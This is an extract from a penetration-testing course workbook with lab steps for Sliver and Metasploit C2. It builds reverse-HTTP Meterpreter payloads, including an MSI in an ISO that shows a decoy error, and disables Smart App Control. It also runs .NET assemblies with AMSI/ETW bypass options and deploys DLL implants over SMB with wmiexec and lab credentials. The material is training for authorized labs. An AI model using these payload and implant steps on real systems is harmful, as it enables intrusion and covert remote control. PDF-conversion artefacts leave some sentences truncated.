|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |
|                 |  |  |  |

#### Expected Results

Session ID: e2e1e42c-e7a4-49c8-92ab-db4bb3070065

Name: first

Hostname: SEC560-Windows

UUID: c8ac4d56-4687-0cb8-6cb2-39029c6c881c

Username: SEC560-WINDOWS\sec560

 UID: S-1-5-21-735291427-3883168089-1835107861-1000 GID: S-1-5-21-735291427-3883168089-1835107861-513

 PID: 6012 OS: windows

Version: 10 build 26100 x86\_64

 Locale: en-US Arch: amd64

 Active C2: https://192.168.188.143 Remote Address: 192.168.188.145:52130

Proxy URL:

Reconnect Interval: 1m0s

 First Contact: Sun Sep 21 02:54:13 UTC 2025 (46m57s ago) Last Checkin: Sun Sep 21 03:41:09 UTC 2025 (1s ago)

Occasionally, some information isn't returned and may display <err>

#### What would this look like with an ARM payload?

notice the version is blank below.

#### Expected Results

Session ID: e5d64a3f-0f91-42e7-963a-034beb7a7b42

Name: arm64

Hostname: SEC560-Windows

UUID: 11a64d56-10cf-e823-c6d6-1101917c29ff

Username: SEC560-WINDOWS\sec560

 UID: S-1-5-21-2305247431-1753473605-2893076173-1000 GID: S-1-5-21-2305247431-1753473605-2893076173-513

 PID: 8604 OS: windows

Version:

 Locale: en-US Arch: arm64

 Active C2: https://192.168.17.131 Remote Address: 192.168.17.130:49697

Proxy URL:

Reconnect Interval: 1m0s

 First Contact: Sun Sep 21 20:59:22 UTC 2025 (7m36s ago) Last Checkin: Sun Sep 21 21:06:56 UTC 2025 (2s ago)

Here we see information about the current user and details about the host.

#### *7: Shell*

Similar to Metasploit, we can drop to a command shell with the shell command.

Run shell :

shell

#### Expected Results

#### ? This action is bad OPSEC, are you an adult? Y

- [\*] Wait approximately 10 seconds after exit, and press <enter> to continue
- [\*] Opening shell tunnel (EOF to exit) ...
- [\*] Started remote shell with pid 3144

Cannot load PSReadline module. Console is running without PSReadline. PS C:\Users\sec560>

#### Bad OPSEC

When you run shell you get a notification that this is bad OPSEC. Defensive tools are tuned to look for processes spawning tools commonly used by malicious actors, such as CMD and PowerShell.

For now, type Y and press Enter to accept the warning. If you need to, you can fib a bit and say you're an adult ;)

P.S. Good OPSEC is *way* more important in Red Team engagements, or any other sort of engagement that requires stealth.

You'll see we now have an interactive PowerShell prompt. We can run any PowerShell command. Run ls c:\ to look at the root of the drive.

![](SEC560_WorkBook1_page_263_Figure_0.jpeg)

Exit of out of this shell by typing exit . We'll try some other tools to learn about other systems.

exit

#### Expected Results

PS C:\Users\sec560\Desktop> exit exit

Shell exited

#### Warning

Sometimes the exit command doesn't finish in a timely fashion on this latest Windows 11 revision. If you don't see the prompt return after a few seconds, press Ctrl+C to exit , then restart it by re-running . Then, interact with the session again using use and the first few characters of the session ID.

#### *8: Execute Assembly - SharpWMI*

We don't have a large number of built-in post-exploitation tools like we do with Metasploit. However, we can execute an assembly with execute-assembly. According to Microsoft:

An assembly is a collection of types and resources that are built to work together and form a logical unit of functionality. Assemblies take the form of executable (.exe) or dynamic link library (.dll) files, and are the building blocks of .NET applications. They provide the common language runtime with the information it needs to be aware of type implementations.

We'll use another such assembly at the end of section 3, Seatbelt! It is part of GhostPack, which includes other assemblies as well. We're going to use SharpWMI. To do this, we need to use the execute-assembly command and give it the path to the SharpWMI.exe on our Linux system.

# Command execute-assembly /home/sec560/labs/SharpWMI.exe Expected Results [!] rpc error: code = Unknown desc = exec: "notepad.exe": executable file not found in %PATH%

Interesting! Why did we get an error about notepad.exe? Let's look at the options for execute-assembly.

execute-assembly -h

#### Expected Results

Command: execute-assembly [local path to assembly] [arguments] About: (Windows Only) Executes the .NET assembly in a child process.

#### Usage:

======

execute-assembly [flags] filepath [arguments...]

#### Args:

=====

filepath string path the assembly file

arguments string list arguments to pass to the assembly entrypoint (default: [])

#### Flags:

======

-M, --amsi-bypass Bypass AMSI on Windows (only supported when used with --

in-process)

-d, --app-domain string AppDomain name to create for .NET assembly. Generated randomly if not set.

-a, --arch string Assembly target architecture: x86, x64, x84 (x86+x64)

(default: x84)

-c, --class string Optional class name (required for .NET DLL)

-E, --etw-bypass Bypass ETW on Windows (only supported when used with --

in-process)

-h, --help display help

-X, --loot save output as loot

-m, --method string Optional method (a method is required for a .NET DLL)

-n, --name string name to assign loot (optional)

-P, --ppid uint parent process id (optional) (default: 0)

-p, --process string hosting process to inject into (default: notepad.exe)

-A, --process-arguments string arguments to pass to the hosting process

-r, --runtime string Runtime to use for running the assembly (only supported

when used with --in-process) -s, --save save output to file

-t, --timeout int command timeout in seconds (default: 60)

As you can see in the description of the -p execute-assembly, it needs a process to inject the assembly into. If one isn't provided, it defaults to running notepad.exe and injecting the assembly into that process. Since your Windows VM doesn't have notepad.exe installed, the default fails. We have a few options to deal with this.

- We could use -i , which tells the implant to use itself to execute the assembly. There are OPSEC downsides, here. For instance, this will load .Net related DLLs into a Go binary. That is strange activity that EDRs can easily detect. It also leaves scanners. 1.
- We can specify a different executable name, like calc.exe , explorer.exe , etc. Your implant will launch that program as a child process and inject the assembly. As soon as it's done, the child process immediately exits. While the child process and assembly injection might still get detected, this approach bene are not left in memory for other tools to scan and discover later. 2.

For simplicity in this introductory lab, we'll stick to -i and use first.exe 's own process.

execute-assembly -i /home/sec560/labs/SharpWMI.exe

#### Linux is case-sensitive!

You must type the same case as above. Linux has a case-sensitive file system (unlike Windows).

#### Expected Results

#### [\*] Output:

:: GhostPack/SharpWMI - a C# implementation of various WMI functionality.

This implementation is a refurbished and enhanced version of original SharpWMI by @harmj0y that adds some more

flexibility for working with malicious VBS scripts, AMSI evasion, file upload purely via WMI and makes it possible

to return output from WMI remotely executed commands.

#### AUTHORS:

Original SharpWMI written: Will Schroeder @harmj0y (https://github.com/GhostPack/

SharpWMI)

Enhancements, VBS flexibility, more actions: Mariusz B. / mgeeky @mariuszbit

WMI code-exec output idea: Evi1cg @Ridter

AMSI evasion code taken from SharpMove: Steven Flores 0xthirteen

Install MSI files: Justin Bui @slyd0g

#### USAGE:

Local system enumeration:

SharpWMI.exe action=query query="select \* from win32\_service" [namespace=BLAH]

...truncated for brevity...

You should see SharpWMI's help.

file and executed it in its own memory space. Since the file is never written to disk, it is more difficult for some defensive tools to detect the execution.

that same info from remote systems. Since we're only working with one Windows system, we'll use SharpWMI's firewall action to enumerate firewall rules on the compromised system.

execute-assembly -i /home/sec560/labs/SharpWMI.exe action=firewall

#### Linux is Case-Sensitive!

You must type the same case as above. Linux has a case-sensitive file system (unlike Windows).

#### Expected Results

[\*] Output:

Scope: \\localhost\ROOT\StandardCIMV2

Rulename : Network Discovery (WSD Events-In)

Action : 2 (Allow) Direction : 1 (Inbound) LocalPorts : 5357

Rulename : Remote Assistance (DCOM-In)

Action : 2 (Allow) Direction : 1 (Inbound) LocalPorts : 135

Rulename : Network Discovery (WSD EventsSecure-In)

Action : 2 (Allow) Direction : 1 (Inbound) LocalPorts : 5358 ...truncated for brevity...

Learning about one system's firewall rules helps us understand what controls might exist on other systems we need to attack. We can use this to target other systems too. We'll do this later on a pivoting lab!

Another excellent C# assembly is Rubeus (we'll cover this tool in 560.4 and 560.5). These additional tools allow us to extend the capabilities of this tool!

#### *Bonus Challenges*

#### *Bonus 1 - Other .NET Assemblies*

Experiment using the other .NET assemblies located in ~/labs. You'll have to run your implant as administrator (right click, run as Administrator) or escalate privileges first.

#### *Bonus 2 - Multiplayer*

Find someone else in class and create a "player" for them. Share the config file and use a shared session. This will be quite useful for the capstone CTF.

If you want to share your configuration with others, or exploit machines inside the OpenVPN range, you'll need to have your HTTPS listener and generate commands pointing to your tun0 interface (10.254.X.Y) instead of your eth0 interface.

dump the password hashes from your Windows VM.

*Hint: Start by running* armory search dump

#### Conclusion

easily load third-party assemblies and extract information (Metasploit can do this too now). One of the nicest features is the multiplayer functionality.

The easiest way to reset your Windows and Linux VMs is to restart them. Alternately, you can close all the terminal windows inside your Linux VM and kill first.exe in your Windows VM.

## *Lab 3.4: Payloads*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Objectives

- Understand the payload options available with MSFVenom and Metasploit •
- Setup a Metasploit multi/handler to receive multiple connections •
- Generate multiple Metasploit/MSFVenom payloads •

#### •

#### Lab Setup

VMs used:

- Linux •
- Windows 11 •

You should be able to ping 10.130.10.25 from the Linux VM:

#### Command

ping -c 4 10.130.10.25

#### Expected Results

sec560@560vm:~\$ ping -c 4 10 .130.10.25 PING 10.130.10.25 (10.130.10.25) 56(84) bytes of data. 64 bytes from 10.130.10.25: icmp\_seq=1 ttl=127 time=75.1 ms 64 bytes from 10.130.10.25: icmp\_seq=2 ttl=127 time=76.7 ms 64 bytes from 10.130.10.25: icmp\_seq=3 ttl=127 time=81.0 ms 64 bytes from 10.130.10.25: icmp\_seq=4 ttl=127 time=75.6 ms --- 10.130.10.25 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3004ms rtt min/avg/max/mdev = 75.109/77.108/81.021/2.330 ms

#### Prior to running this lab for the first time...

The Windows VM is running Smart App Control in Evaluation mode. While that is a real defense that may need to be evaded in real engagements, evading that control is not part of this lab. When these commands are run, it permanently disables Smart App Control, and it cannot be re-enabled without re-installing Windows. If you would like to attempt to evade Smart App Control, you should take a snapshot of your VM prior to running these commands.

Open Terminal using the shortcut on the Desktop and run the following commands:

#### Command

reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v VerifiedAndReputablePolicyState /t REG\_DWORD /d 0 /f citool -r

#### Expected Results

PS C:\Users\sec560> reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v VerifiedAndReputablePolicyState /t REG\_DWORD /d 0 /f The operation completed successfully. PS C:\Users\sec560> citool -r Operation Successful Press Enter to Continue

PS C:\Users\sec560>

#### Lab – Step-by-Step Instructions

#### *1: Setup Metasploit to Receive a Connection*

First, we need to setup Metasploit to receive the connection from our payloads. Launch Metasploit by running msfconsole.

#### Command

msfconsole

In Metasploit, we'll use the multi/handler "exploit" to receive the connection. The Multi Handler is not an exploit, it simply tells Metasploit that we are going to be launching our payload outside of Metasploit and it should be ready to receive the connection. Let's use the handler.

# Command use exploit/multi/handler Expected Results msf > use exploit/multi/handler [\*] Using configured payload generic/shell\_reverse\_tcp msf exploit(multi/handler) >

Notice that Metasploit selected a default payload of generic/shell\_reverse\_tcp . This isn't the ideal payload, so let's change it to Meterpreter.

# Command set PAYLOAD windows/meterpreter/reverse\_http Expected Results msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse\_http PAYLOAD => windows/meterpreter/reverse\_http msf exploit(multi/handler) >

Let's take a look at the options we have available with this exploit and payload.

# Command show options Expected Results msf exploit(multi/handler) > show options Payload options (windows/meterpreter/reverse\_http): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The local listener hostname LPORT 8080 yes The local listener port LURI no The HTTP Path Exploit target: Id Name -- ---- 0 Wildcard Target View the full module info with the info, or info -d command.

Notice that our dummy exploit has no options. For the payload, we need to set the port and host. Let's change the LHOST to eth0 and the LPORT to 3333.

# Command set LHOST eth0 set LPORT 3333 Expected Results msf exploit(multi/handler) > set LHOST eth0 LHOST => 192.168.188.143 msf exploit(multi/handler) > set LPORT 3333 LPORT => 3333

Confirm the settings are correct by running show options again.

![](SEC560_WorkBook1_page_276_Figure_1.jpeg)

Notice that eth0 is automatically expanded into the IP address associated with the eth0 interface.

We can setup our listener to receive multiple connections so we don't have to restart the listener. We can do that by setting ExitOnSession to false . We'll also set the AutoLoadExtensions to load stdapi,priv

![](SEC560_WorkBook1_page_276_Figure_4.jpeg)

Let's launch the listener running it as a job ( -j ) and not interacting with new connections ( -z ).

run -j -z

#### Expected Results

msf exploit(multi/handler) > run -j -z

[\*] Exploit running as background job 0.

[\*] Exploit completed, but no session was created. msf exploit(multi/handler) >

[\*] Started HTTP reverse handler on http://192.168.188.143:3333

Note: Your IP address will be different.

You can press Enter to get back to the normal Metasploit prompt.

Metasploit is setup to receive your connection. Now let's create the payload.

#### *2: Metasploit Payloads with MSFVenom*

We are going to use msfvenom to generate a few payloads that will execute on your local Windows VM.

First, open up a new terminal and let's take a look at the payload output formats.

```
Command
 msfvenom --list formats
 Expected Results
  sec560@560vm:~$ msfvenom --list formats
  Framework Executable Formats [--format <value>]
  ===============================================
   Name
   ----
   asp
   aspx
   aspx-exe
   axis2
   dll
  ...truncated for brevity...
```

Normally, we'd generate a VBA macro to put in an Office document and use that for social engineering; however, our Windows VM does not have Office installed. To keep things simple for our first payload, let's just make an EXE. We'll get more advanced later in the lab.

![](SEC560_WorkBook1_page_278_Figure_2.jpeg)

Let's copy the file over to Windows.

*3: Copy the EXE Payload to Windows and Execute It*

#### Open a new terminal for this step.

```
Command
 ruby -run -e httpd /tmp
 Expected Results
   sec560@560vm:~$ruby -run -e httpd /tmp
   [2025-09-22 00:45:18 ] INFO WEBrick 1 .8.1
   [2025-09-22 00:45:18 ] INFO ruby 3.2.3 (2024-01-18 ) [ x86_64-linux-gnu ]
   [2025-09-22 00:45:18 ] INFO WEBrick::HTTPServer#start: pid=3156454 port=8080
   [2025-09-22 00:45:18 ] INFO To access this server, open this URLin a browser:
   [2025-09-22 00:45:18 ] INFO http://127.0.0.1:8080
   [2025-09-22 00:45:18 ] INFO http:// [::1 ]:8080
```

Switch to Windows and open a PowerShell prompt using the Terminal shortcut on the Windows desktop. Then run the following command.

![](SEC560_WorkBook1_page_279_Figure_4.jpeg)

Let's launch the payload!

# Command payload.exe Expected Results PC:\Users\sec560> .\payload.exe PC:\Users\sec560>

Switch to your Metasploit terminal on your Linux VM. You should see a new session.

#### Expected Results

[\*] http://192.168.188.143:3333 handling request from 192.168.188.145; (UUID: e8h3my6a) Staging x86 payload (178780 bytes) ...

[\*] Meterpreter session 1 opened (192.168.188.143:3333 -> 192.168.188.145:14384) at 2025-09-22 00:52:20 +0000

You now have a Meterpreter session running on your Windows host using payload.exe. You can press Enter to get back to the normal Metasploit prompt (though it's not necessary, as the status message simply overwrote the prompt). Next, we need to interact with the session. In the example here, the session ID is 1 . Your session ID may be different. Use the number you see instead of the 1 if this is the case.

# Command sessions -i 1 Expected Results msf exploit(multi/handler) > sessions -i 1 [\*] Starting interaction with 1... meterpreter >

Run sysinfo to get basic information about the session.

#### sysinfo

#### Expected Results

meterpreter > sysinfo

Computer : SEC560-WINDOWS

OS : Windows 11 24H2+ (10.0 Build 26100).

Architecture : x64 System Language : en\_US Domain : WORKGROUP

Logged On Users : 2

Meterpreter : x86/windows

We're going to use another payload next, so let's exit this session.

#### Command

exit

#### Expected Results

meterpreter > exit

[\*] Shutting down Meterpreter...

[\*] 192.168.188.145 - Meterpreter session 1 closed. Reason: User exit msf exploit(multi/handler) >

#### *4: Creating an MSI Payload in an ISO File*

We'll create our next payload from msfconsole. We'll need to select use the payload and then set the LHOST and LPORT appropriately. Let's generate an MSI installer file. These files are sometimes allowed to be run even when other file types are disabled.

use payload/windows/meterpreter/reverse\_http

set LHOSTeth0

set LPORT 3333

#### Expected Results

msf exploit(multi/handler) > use payload/windows/meterpreter/reverse\_http msf payload(windows/meterpreter/reverse\_http) > set LHOST eth0 LHOST => 192.168.188.143

msf payload(windows/meterpreter/reverse\_http) > set LPORT 3333

LPORT => 3333

msf payload(windows/meterpreter/reverse\_http) >

To generate the MSI file, we'll use the generate command, specify the msi as the format, and save the file to /tmp .

#### Command

generate -f msi -o /tmp/SETUP.MSI

#### Expected Results

msf payload(windows/meterpreter/reverse\_http) > generate -f msi -o /tmp/SETUP.MSI [\*] Writing 159744 bytes to /tmp/SETUP.MSI...

To create an ISO file, we'll use the genisoimage tool. It's not part of Metasploit, but we can run regular shell commands at the msf > prompts, too. With genisoimage, we can specify a directory or one or more files. We'll place the msi file in the ISO file.

genisoimage -o /tmp/installer.iso /tmp/SETUP.MSI

#### Expected Results

msf payload(windows/meterpreter/reverse\_http) > genisoimage -o /tmp/installer.iso /tmp/ SETUP.MSI

[\*] exec: genisoimage -o /tmp/installer.iso /tmp/SETUP.MSI

I: -input-charset not specified, using utf-8 (detected in locale settings)

Total translation table size: 0 Total rockridge attributes bytes: 0 Total directory bytes: 0

Path table size(bytes): 10 Max brk space used 0 252 extents written (0 MB)

Let's switch to Windows and download and open the file.

#### *5: Download and Open ISO and MSI Files*

In the PowerShell prompt, download the ISO file to your Desktop. Remember that the Ruby httpd server lists on 8080 by default.

#### Command

NOTE: You will need to replace LINUX\_ETH0\_ADDRESS with the IP address of your Linux VM's eth0 interface.

curl http://LINUX\_ETH0\_ADDRESS:8080/installer.iso -o .\Desktop\installer.iso

#### Expected Results

PS C:\Users\sec560> curl http://192.168.188.143:8080/installer.iso -o . \Desktop\installer.iso

% Total% Received % XferdAverage SpeedTimeTimeTimeCurrent

Dload Upload Total Spent Left Speed

100 504k 100 504k 0 0 9589k 0 --:--:-- --:--:-- --:--:-- 9692k

On your desktop you will now see installer.iso . Double click the file to mount it. Then, double click the SETUP.MSI file to run it.

![](SEC560_WorkBook1_page_284_Picture_0.jpeg)

Click Yes on the User Account Control prompt.

You'll see the installer run, but then it displays an error message.

There is a problem with this Windows Installer package. A script required for this install to complete could not be run. Contact your support personnel or package vendor.

This error message is expected. It is used to trick the user into thinking that nothing happened. However, if you switch to Metasploit you will see a new Meterpreter session has just been initiated.

# Expected Results msf payload(windows/meterpreter/reverse\_http) > [\*] http://192.168.188.143:3333 handling request from 192.168.188.145; (UUID: e8h3my6a) Staging x86 payload (178780 bytes) ... [\*] Meterpreter session 2 opened (192.168.188.143:3333 -> 192.168.188.145:16772) at 2025-09-22 01:30:10 +0000

You now have a Meterpreter session running on your Windows host using the ISO and MSI payload. If you like, you can again press Enter to get back to the normal Metasploit prompt. First, we need to interact with the session. In the example here, the session ID is 2 . Your session ID may be different. Use the number you see instead of the 2 if this is the case.

sessions -i 2

#### Expected Results

msf exploit(multi/handler) > sessions -i 2 [\*] Starting interaction with 2...

meterpreter >

Again, run sysinfo to get basic information on this session.

#### Command

sysinfo

#### Expected Results

meterpreter > sysinfo

Computer : SEC560-WINDOWS

OS : Windows 11 24H2+ (10.0 Build 26100).

Architecture : x64 System Language : en\_US Domain : WORKGROUP

Logged On Users : 2

Meterpreter : x86/windows

# Command exit exit -y Expected Results meterpreter > exit [\*] Shutting down session: 2 [\*] 192.168.188.145 - Meterpreter session 2 closed. Reason: User exit msf exploit(multi/handler) > exit -y

# Command

Setup a listener on port 443 by running https to start the listener.

# Command https Expected Results [\*] Starting HTTPS :443 listener ... [\*] Successfully started job #1

Let's take a look at the options with generate.

generate -h

#### Expected Results

Command: generate <options>

with --save.

...trimmed for brevity...

++ Formats ++

Supported output formats are Windows PE, Windows DLL, Windows Shellcode, Mach-O, and ELF. The output format is controlled

with the --os and --format flags.

To output a 64bit Windows PE file (defaults to WinPE/64bit), either of the following command would be used:

 generate --mtls foo.example.com generate --os windows --arch 64bit --mtls foo.example.com

A Windows DLL can be generated with the following command: generate --format shared --mtls foo.example.com

To output a MacOS Mach-O executable file, the following command would be used generate --os mac --mtls foo.example.com

To output a Linux ELF executable file, the following command would be used: generate --os linux --mtls foo.example.com

...trimmed for brevity...

Look at the ++ Formats ++ section. Notice that we don't have wide variety of output options that we do with Metasploit. When

Let's generate an exe file that we'll run on one of the hosts in the target range. We'll use the --skip-symbols option to speed up the payload generation or else it can take a minute or more to generate the payload due to the extra evasion and encryption used in the executable. In the real world, you'll likely NOT want to use this option.

NOTE: Replace LINUX\_TUN0\_ADDRESS with the IP address of your Linux VM's tun0 address beginning with 10.254.x.x .

generate --os windows --arch 64bit --format shared --skip-symbols --http https://LINUX\_TUN0\_ADDRESS

#### Expected Results

#### http https://10.254.252.6

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [\*] Build completed in 7s
- [\*] Implant saved to /home/sec560/DEFIANT\_MANUFACTURER.dll

NOTE: Your payload name will be randomly generated and will be different than the DEFIANT\_MANUFACTURER.dll you see here.

#### *7: Copying and Executing the DLL*

#### Open a new terminal for this step.

The file created is owned by root and is not accessible by our sec560 user. Let's confirm this by using ls -l .

#### Command

ls -l \*.dll

#### Expected Results

sec560@560vm:~\$ ls -l \*.dll

-rwx------ 1 root root 11022336 Sep 22 01:34 DEFIANT\_MANUFACTURER.dll

Note that the rwx (Read, Write, Execute) permission only apply to the owner of the file, root . Let's change the owner of the file to sec560 so we can interact with the file.

# Command sudo chown sec560:sec560 \*.dll && ls -l \*.dll Expected Results sec560@560vm:~\$ sudo chown sec560:sec560 \*.dll && ls -l \*.dll -rwx------ 1 sec560 sec560 11022336 Sep 22 01:34 DEFIANT\_MANUFACTURER.dll

You should now see that the owner of the file is sec560.

We're going to use two tools, one from the SAMBA suite and the other from the Impacket framework. We'll discuss Impacket in more depth later, but we need to use the tools now.

First, we will use smbclient to connect to the c\$ share. From here, we could browse the entire file system of the remote host.

![](SEC560_WorkBook1_page_289_Figure_4.jpeg)

Once connected to the C\$ share, we can upload our payload. The syntax for smbclient is very similar to that of an FTP client.

NOTE: Replace PAYLOAD\_NAME

put YOUR\_PAYLOAD\_NAME.dll ls YOUR\_PAYLOAD\_NAME.dll

#### Expected Results

smb: \> put DEFIANT\_MANUFACTURER.dll

putting file DEFIANT\_MANUFACTURER.dll as \DEFIANT\_MANUFACTURER.dll (2367.3 kb/s) (average 2367.3 kb/s)

smb: \> ls DEFIANT\_MANUFACTURER.dll

DEFIANT\_MANUFACTURER.dll A 11022336 Mon Sep 22 01:42:19 2025

Using smbclient 's ls command, you should see your DLL file in the root of the drive on the remote server. You can now exit the smbclient session.

#### Command

exit

This command has no output.

Let's use an Impacket tool to execute the payload, wmiexec.py.

NOTE: Replace PAYLOAD\_NAME

wmiexec.py hiboxy/bgreen:Password1@10.130.10.25 regsvr32 PAYLOAD\_NAME.dll

#### Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy/bgreen:Password1@10.130.10.25 /usr/local/lib/python3.12/dist-packages/impacket/version.py:12: UserWarning: pkg\_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg\_resources.html. The pkg\_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81. import pkg\_resources

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] SMBv3.0 dialect used
- [!] Launching semi-interactive shell Careful what you execute
- [!] Press help for extra shell commands

C:\>regsvr32 DEFIANT\_MANUFACTURER.dll

#### Expected Results

[\*] Session 08fe8eec DEFIANT\_MANUFACTURER - 10.130.10.25:12012 (mail01) - windows/amd64 - Mon, 22 Sep 2025 01:51:38 UTC

The session ID here is 08fe8eec, but yours will be different. You only need to use the first character as long as it is unique across all your sessions. We'll use the first two to reduce the likelihood of a duplication of the first character.

Let's interact with the session. In this example, the shortened session ID is 08, yours will likely be different.

NOTE: Replace 08 with the first character of your session ID.

use 08

#### Expected Results

[\*] Active session MOTIONLESS\_WEALTH (08fe8eec-98ee-4c41-9142-789aa9d01fae)

Run info to get information about the session. Your information will be different than what is shown here.

#### Command

info

#### Expected Results

Session ID: 08fe8eec-98ee-4c41-9142-789aa9d01fae

Name: MOTIONLESS\_WEALTH

Hostname: mail01

UUID: ec201d26-96d1-bc9b-ed63-15fc92814bfe

Username: HIBOXY\bgreen

 UID: S-1-5-21-2939331289-1713847731-564771466-1177 GID: S-1-5-21-2939331289-1713847731-564771466-513

 PID: 21060 OS: windows

Version: Server 2016 build 20348 x86\_64

 Locale: en-US Arch: amd64

 Active C2: https://10.254.252.6 Remote Address: 10.130.10.25:12012

Proxy URL:

Reconnect Interval: 1m0s

 First Contact: Mon Sep 22 01:51:38 UTC 2025 (3m12s ago) Last Checkin: Mon Sep 22 01:54:49 UTC 2025 (1s ago)

To clean up, exit your session, CTRL-C out from wmiexec.py

In this example, we used a DLL file. We could have just as easily generated an EXE file and executed it directly instead of using regsvr32 with a DLL.

#### Conclusion

commonly with shellcode from the C2 framework.

## *Lab 3.5: Seatbelt*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Overview

We are going to use Seatbelt to better understand the configuration of our Windows 11 system.

#### Lab Setup

VM used:

Windows 11 •

You should be able to ping 10.130.10.10 from the Windows VM:

ping 10.130.10.10

#### Expected Results

C:\Users\sec560> ping 10.130.10.10

Pinging 10.130.10.10 with 32 bytes of data:

Reply from 10.130.10.10: bytes=32 time=122ms TTL=63

Reply from 10.130.10.10: bytes=32 time=122ms TTL=63

Reply from 10.130.10.10: bytes=32 time=127ms TTL=63

Reply from 10.130.10.10: bytes=32 time=122ms TTL=63

Ping statistics for 10.130.10.10:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 122ms, Maximum = 127ms, Average = 123ms

#### Lab – Step-by-Step Instructions

#### *1: Launching Seatbelt*

Per the project website:

Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.

Launch the Terminal shortcut on your Windows desktop. We're going to open a CMD.exe window with CTRL+ SHIFT+ 2 .

#### Command

seatbelt

When we run Seatbelt, it displays an ASCII art seatbelt on the screen and provides the results.

#### *2: Single Checks*

We can run individual checks using the name of the speci fic command. Let's run Seatbelt and get information about our current AV.

### Command seatbelt AntiVirus Expected Results C:\Users\sec560> seatbelt AntiVirus %&& @@@&& &&&&&&&%%%, #&&@@@@@@%%%%%%###############% &%& %&%% &////(((&%%%% %#%################//((((###%%%%%%%%%%%%%%% %%%%%%%%%%%######%%%#%%####% & %%\*\*#@//// (((& %%%%% %###################### ((((((((((((((((((( #%#%%%%%%%#######%#%%#######%&%,,,,,,,,,,,,,,,,@//// (((& %%%% %#%##################### ((((((((((((((((((( #%#%%%%%%#####%%#%#%%#######%%%,,,,,, ,,. ,, @//// (((& %%%%%% %###################### (#(((#(#(((((((((( #####%%%#################### &%%...... ... .. @////(((&%%%%%% %###############%######((#(#(####(((((((( #######%##########%######### %%%...... ... .. @////(((&%%%% %#########################(#(#######((##### ###%##%%#################### &%%............... @////(((&%%%%%%% %##############%#######(#########((##### #####%###################### %%%.. @////(((&%%%%%%%################ &%& %%%%% Seatbelt %////(((&%%%%%%%%#############\* &%%&&&%%%%% v1.2.2 ,(((&%%%%%%%%%%%%%%%%%, # %%%%##, ====== AntiVirus ====== [\*] Completed collection in 0.042 seconds

Microsoft Defender has been *thoroughly* disabled on this Windows 11 system, which is why we're seeing no results from this command. If you're curious, Defender was stripped from the installation media itself using DefenderProTools .

Let's take a look at what is installed on our system. In a real pen test, the software on one system is likely to be similar to other systems. We could use vulnerabilities in that software to pivot between systems.

seatbelt InstalledProducts

#### Expected Results

C:\Users\sec560> seatbelt InstalledProducts

====== InstalledProducts ======

 DisplayName : BleachBit DisplayVersion : 5.0.0.2936 Publisher : BleachBit

InstallDate : 1/1/0001 12:00:00 AM

Architecture : x86

DisplayName : Icecast v2.0.0

 DisplayVersion : Publisher :

InstallDate : 1/1/0001 12:00:00 AM

Architecture : x86

 DisplayName : Microsoft Edge DisplayVersion : 140.0.3485.81 Publisher : Microsoft Corporation InstallDate : 1/1/0001 12:00:00 AM

Architecture : x86

DisplayName : Microsoft Edge WebView2 Runtime

 DisplayVersion : 140.0.3485.81 Publisher : Microsoft Corporation InstallDate : 1/1/0001 12:00:00 AM

Architecture : x86

 DisplayName : Nmap 7.98 DisplayVersion : 7.98 Publisher : Nmap Project

InstallDate : 1/1/0001 12:00:00 AM

 Architecture : x86 ...truncated for brevity...

#### The details of each system may differ.

Some of the functions in Seatbelt perform actions similarly to built-in commands. The benefit is that we may be able to load this .NET Assembly (EXE) into memory on a target system and query things like the built-in netstat , but without using *cmd*, *PowerShell*, or the netstat executables, which may be monitored for access.

Let's take a look at one such function, TcpConnections.

seatbelt TcpConnections

#### Expected Results

```
C:\Users\sec560> seatbelt TcpConnections
 [...skipped ASCII art...]
====== TcpConnections ======
```

```
 Local Address Foreign Address State PID Service 
ProcessName
 0.0.0.0:80 0.0.0.0:0 LISTEN 4 System
 0.0.0.0:135 0.0.0.0:0 LISTEN 924 RpcSs C:
\WINDOWS\system32\svchost.exe -k RPCSS -p
 0.0.0.0:445 0.0.0.0:0 LISTEN 4 System
 0.0.0.0:5040 0.0.0.0:0 LISTEN 6120 CDPSvc C:
\WINDOWS\system32\svchost.exe -k LocalService -p -s CDPSvc
 0.0.0.0:5985 0.0.0.0:0 LISTEN 4 System
 0.0.0.0:7680 0.0.0.0:0 LISTEN 14284 DoSvc 
svchost.exe
 0.0.0.0:16921 0.0.0.0:0 LISTEN 11888 Spooler C:
\WINDOWS\System32\spoolsv.exe
 0.0.0.0:47001 0.0.0.0:0 LISTEN 4 System
 0.0.0.0:49664 0.0.0.0:0 LISTEN 864 lsass.exe
 0.0.0.0:49665 0.0.0.0:0 LISTEN 696 
wininit.exe
 0.0.0.0:49666 0.0.0.0:0 LISTEN 1680 EventLog C:
\WINDOWS\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog
 0.0.0.0:49667 0.0.0.0:0 LISTEN 2072 Schedule C:
\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule
 0.0.0.0:49669 0.0.0.0:0 LISTEN 844 
services.exe
 192.168.188.145:139 0.0.0.0:0 LISTEN 4 System
